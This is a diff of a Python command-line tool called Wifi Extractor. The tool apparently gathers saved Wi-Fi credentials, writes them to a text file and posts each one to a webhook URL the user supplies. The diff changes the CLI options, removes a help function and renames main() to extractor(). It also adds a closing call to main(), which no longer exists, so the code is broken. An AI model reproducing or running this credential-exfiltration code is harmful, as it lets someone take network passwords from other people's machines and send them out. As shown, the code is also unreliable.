@@ -7,22 +7,11 @@ WIFIs = []
 
 @click.command()
 @click.option('--url', '-u', is_flag=True, default='', help='Webhook/POST URL')
-@click.option('--help', '-h', is_flag=True, help='Help')
-@click.option('--only-webhook', '-o', is_flag=True, help='Only send data to webhook (no txt file) | Envía los datos solo a la webhook (sin crear el archivo txt)')
-@click.option('--only-webhook', '-o', is_flag=True, help='Version')
+@click.option('--only-webhook', '-o', is_flag=True, help='Only send data to webhook (no txt file) \n Envía los datos solo a la webhook (sin crear el archivo txt)')
+@click.option('--version', '-v', is_flag=True, help='Imprime la version | Prints the version')
 
-def help():
-    print('''
-    Wifi Extractor
-    
-    -u, --url: Webhook/POST URL (optional)
-    -h, --help: Help/Ayuda
-    -o, --only-webhook (optional): Only send data to webhook (no txt file) | Envía los datos solo a la webhook (sin crear el archivo txt)
-    
-    GitHub: https://github.com/hrdax/WIFI_Extractor
-    ''')
 
-def main():
+def extractor():
     #crea el archivo txt
     txt = open("Extracciones.txt", "w")
 
@@ -67,3 +56,6 @@ def urlweb(url):
         #envia los datos a la url de webhook
         for i in WIFIs:
             requests.post(urlpost, data=i)
+
+if __name__ == '__main__':
+    main()
